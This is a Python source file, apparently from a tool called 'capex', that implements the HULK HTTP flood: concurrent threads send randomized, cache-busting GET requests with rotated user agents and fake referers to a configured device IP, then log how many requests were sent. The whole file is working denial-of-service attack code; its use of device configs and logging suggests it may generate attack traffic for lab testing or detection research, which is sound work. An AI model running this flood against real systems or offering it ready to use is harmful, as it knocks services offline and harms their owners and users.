from __future__ import annotations

import random
import threading
import time
import urllib.error
import urllib.request

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from pathlib import Path

    from capex.models import DeviceConfig, HulkAttackConfig

# HULK - HTTP Unbearable Load King: floods a target with randomized,
# cache-busting GET requests from many concurrent threads.

_USER_AGENTS = [
    'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en) Gecko/20090824 Firefox/3.5.3',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/89.0 Safari/537.36',
    'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
]

_REQUEST_TIMEOUT_SECONDS = 10
_WORKER_JOIN_TIMEOUT_SECONDS = 5
_ERROR_BACKOFF_SECONDS = 0.5


def _random_block(size: int) -> str:
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))


def _build_request(target_url: str, host: str) -> urllib.request.Request:
    param_joiner = '&' if '?' in target_url else '?'
    param_name = _random_block(random.randint(3, 10))
    param_value = _random_block(random.randint(3, 10))
    full_url = f'{target_url}{param_joiner}{param_name}={param_value}'

    referer_base = random.choice(['http://www.google.com/?q=', 'http://www.bing.com/search?q=', f'http://{host}/'])

    request = urllib.request.Request(full_url)
    request.add_header('User-Agent', random.choice(_USER_AGENTS))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', referer_base + _random_block(random.randint(5, 10)))
    request.add_header('Keep-Alive', str(random.randint(110, 120)))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    return request


class _FloodWorker(threading.Thread):
    """Continuously sends flood requests until told to stop."""

    def __init__(self, *, target_url: str, host: str, stop_event: threading.Event) -> None:
        super().__init__(daemon=True)
        self._target_url = target_url
        self._host = host
        self._stop_event = stop_event
        self.request_count = 0

    def run(self) -> None:
        while not self._stop_event.is_set():
            try:
                urllib.request.urlopen(
                    _build_request(self._target_url, self._host),
                    timeout=_REQUEST_TIMEOUT_SECONDS,
                )
            except urllib.error.URLError:
                # Target unreachable/refusing connections; back off briefly
                # rather than spin the CPU retrying as fast as possible.
                self._stop_event.wait(_ERROR_BACKOFF_SECONDS)
            else:
                self.request_count += 1


class HulkAttackExecutor:
    def __init__(self, *, attack: HulkAttackConfig) -> None:
        self._attack = attack

    def execute(
        self,
        *,
        device: DeviceConfig,
        log_path: Path,
    ) -> None:
        target_url = f'http://{device.ip}'
        host = str(device.ip)
        stop_event = threading.Event()

        workers = [
            _FloodWorker(target_url=target_url, host=host, stop_event=stop_event)
            for _ in range(self._attack.thread_count)
        ]
        for worker in workers:
            worker.start()

        time.sleep(self._attack.duration_seconds)

        stop_event.set()
        for worker in workers:
            worker.join(timeout=_WORKER_JOIN_TIMEOUT_SECONDS)

        total_requests = sum(worker.request_count for worker in workers)

        with log_path.open('a', encoding='utf-8') as handle:
            handle.write(
                f'attack={self._attack.label} device={device.name} requests={total_requests} timestamp={time.time()}\n'
            )
